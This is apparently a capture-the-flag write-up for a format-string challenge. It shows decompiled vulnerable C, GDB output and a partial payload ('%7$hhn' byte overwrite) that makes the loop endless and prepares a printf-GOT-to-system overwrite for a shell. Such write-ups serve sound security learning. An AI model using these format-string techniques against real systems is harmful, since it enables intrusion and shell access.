### YET_ANOTHER_FORMAT_STRING_BUG
---
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[270]; // [rsp+0h] [rbp-110h] BYREF
  __int16 v5; // [rsp+10Eh] [rbp-2h]

  v5 = 0;
  setup();
  do
  {
    read(0, buf, 0xFFuLL);
    printf(buf);
  }
  while ( v5 );
  return 0;
}
```
![image](https://github.com/user-attachments/assets/ff5b692f-11a9-4857-bc4e-1507ac78d4b7)

We easily realized that format string bug as it's name. Our plan is to overwrite ``` printf GOT ``` with system and type into ``` /bin/sh ```. The program will execute ``` system('/bin/sh') ```
However, we can't do it by one time payload. Here, we have to change the flow of ``` do-while ``` loop, make it become the endless loop.
```
0x00007fffffffdbb0│+0x0000: 0x00000000000a7325 ("%s\n"?)         ← $rsp, $rsi, $rdi
0x00007fffffffdbb8│+0x0008: 0x00007fffffffdc90  →  0x0000000000000000
gef➤  x/xb $rbp-0x2
0x7fffffffdcbe: 0x00
```
After a few tries, I realized that we can brute-force MSB at address ``` 0x00007fffffffdbb8 ``` and overwrite it. 
One more thing, I found that the address of ```$rbp-0x2``` always ends with ``` e ```, meaning we have 1/16 percent success. 
```
payload= f"c%7$hhn".encode().ljust(8,b"a")
payload+=p8(0x2e)
```
Then we have endless loop, we'll leak libc base address, then system and try to overwrite printf GOT with it. There are many other ways to solve it. Here's my solution:
[script.py](https://github.com/faviconico1910/CTFs/blob/master/0xl4ugh/yet_another_format_string_bug/solve.py)

